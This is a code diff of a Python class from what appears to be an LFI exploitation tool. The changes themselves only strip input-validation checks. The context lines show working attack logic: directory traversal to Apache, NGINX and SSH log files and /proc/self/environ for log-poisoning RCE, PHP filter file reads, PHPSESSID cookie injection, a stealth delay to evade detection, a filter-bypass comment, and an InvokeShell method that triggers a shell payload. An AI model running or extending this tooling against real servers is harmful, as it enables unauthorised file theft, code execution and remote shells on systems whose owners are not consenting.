@@ -59,10 +59,6 @@ class Payload:
 
 
     def InvokeShell(self, exploit, payload):
-        # Verify inputs before use
-        if not exploit or not payload:
-            print(colored('[-]', 'red') + ' Exploit or payload is empty. Exiting...')
-            return
         # Give some time to bind the listener
         time.sleep(2)
         print(colored("[+]", 'green') + " Triggering payload... " + exploit + payload)
@@ -95,10 +91,6 @@ class Payload:
 
 
     def GetPayloads(self, ip, port):
-        # Verify inputs before use
-        if not ip or not port:
-            print(colored('[-]', 'red') + ' IP or port is empty. Exiting...')
-            return []
         cwd = os.path.dirname(__file__)
         with open(str(cwd) + "/misc.txt") as handle:
             payloads = handle.read().split('\n')
@@ -110,10 +102,6 @@ class Payload:
     # TO DO Threading doesn't work
     # Added thread support for the attacks which speeds things up significantly!
     def Attack(self, attempt_shell=False, mode=0, force=False):
-        # Verify inputs before use
-        if not isinstance(attempt_shell, bool) or not isinstance(mode, int) or not isinstance(force, bool):
-            print(colored('[-]', 'red') + ' Invalid input types for Attack method. Exiting...')
-            return
         if not force and not self.urlCheck():
             return
         
@@ -165,10 +153,6 @@ class Payload:
 
     # It sends the url as is without decoding it first, so that it can bypass filters that look for ..
     def hit(self, url):
-        # Verify input before use
-        if not url:
-            print(colored('[-]', 'red') + ' URL is empty. Exiting...')
-            return
         if self.stealth:
             time.sleep(random.randint(2,6)) # Sleep for a random interval of seconds (between 2 and 6) per request to be more stealthy
         if self.proxies:
@@ -207,10 +191,9 @@ class Payload:
     
     
     def string_to_dict(self, header_or_cookie_string):
-        # Verify input before use
         if not header_or_cookie_string:
             print(colored('[-]','red', attrs=['bold']) + ' Reason: ' +  "Cookie string is not set can't convert to dict")
-            return
+            raise ValueError("Cookie string is not set can't convert to dict")
 
         # Split the string into individual key-value pairs, then split each pair by the first ':' for headers or '=' for cookies
         result = {}
@@ -228,9 +211,6 @@ class Payload:
 
 
     def urlCheck(self):
-        if not self.domain:
-            print(colored('[-]', 'red') + ' Domain is empty. Exiting...')
-            return False
         # Extract the domain with protocol from the provided url
         self.domain = urllib.parse.urlparse(self.url).scheme + '://' + urllib.parse.urlparse(self.url).netloc
         
@@ -263,10 +243,6 @@ class Payload:
 
 
     def cred(self, url):
-        # Verify input before use
-        if not url or not self.creds:
-            print(colored('[-]', 'red') + ' URL or credentials are empty. Exiting...')
-            return
         list_creds = self.creds.split(':')
         user = list_creds[0]
         passwd = list_creds[1]
@@ -285,10 +261,6 @@ class Payload:
 
     # Checks for directory traversal
     def dirTraversalCheck(self):
-        # Verify inputs before use
-        if not self.linux_dirTraversal or not self.poc:
-            print(colored('[-]', 'red') + ' Directory traversal or POC is empty. Exiting...')
-            return
         for traversal in self.linux_dirTraversal:
             for poc in self.poc:
                 if not self.override_poc:
@@ -310,9 +282,7 @@ class Payload:
 
     # Checks for Remote Code Execution with php headers
     def headerCheck(self):
-        # Verify inputs before use
-        if not self.phpHeaders:
-            print(colored('[-]', 'red') + ' PHP headers are empty. Exiting...')
+        if self.phpHeaders is None:
             return
         rce = []
         for header in self.phpHeaders:
@@ -336,10 +306,6 @@ class Payload:
     
     # Checks if it can retrieve files with the php filter	
     def filterCheck(self):
-        # Verify inputs before use
-        if not self.filterPaths:
-            print(colored('[-]', 'red') + ' Filter paths are empty. Exiting...')
-            return
         for path in self.filterPaths:
             compUrl = self.url + self.filterBase + path
             if self.verbosity > 1:
@@ -366,10 +332,6 @@ class Payload:
 
     # Checks if the PHPSESSID cookie can be exploited
     def cookieCheck(self):
-        # Verify inputs before use
-        if not self.cookies:
-            print(colored('[-]', 'red') + ' Cookies are empty. Exiting...')
-            return
         if self.verbosity > 1:
             print(colored('[*]', 'yellow', attrs=['bold']) + ' Testing: PHPSESSID cookie injection')
         s = requests.Session()
@@ -455,9 +417,6 @@ class Payload:
         # Apache logs with the litespeed variation
         logPath = [quote("/var/log/apache2/access.log"), quote("/var/log/apache/access.log"), quote("/var/log/apache2/error.log"), quote("/var/log/apache/error.log"), quote("/usr/local/apache/log/error_log"), quote("/usr/local/apache2/log/error_log"), quote("/var/log/sshd.log"), quote("/var/log/mail"), quote("/var/log/vsftpd.log"), quote("/proc/self/environ"), quote("/usr/local/apache/logs/access_log")]
         rce = []
-        if not self.linux_dirTraversal:
-            print(colored('[-]', 'red') + ' Directory traversal paths are empty. Exiting...')
-            return
         for d_path in self.linux_dirTraversal:
             for l_path in logPath:
                 pathth = self.url + d_path + l_path
@@ -481,9 +440,6 @@ class Payload:
             print(colored('[*]', 'yellow', attrs=['bold']) + ' Server Identified as NGINX')
         log = [quote("/var/log/nginx/error.log"), quote("/var/log/nginx/access.log"), quote("/var/log/httpd/error_log")]
         rce = []
-        if not self.linux_dirTraversal:
-            print(colored('[-]', 'red') + ' Directory traversal paths are empty. Exiting...')
-            return
         for d_path in self.linux_dirTraversal:
             for l_path in log:
                 pathh = self.url + d_path + l_path
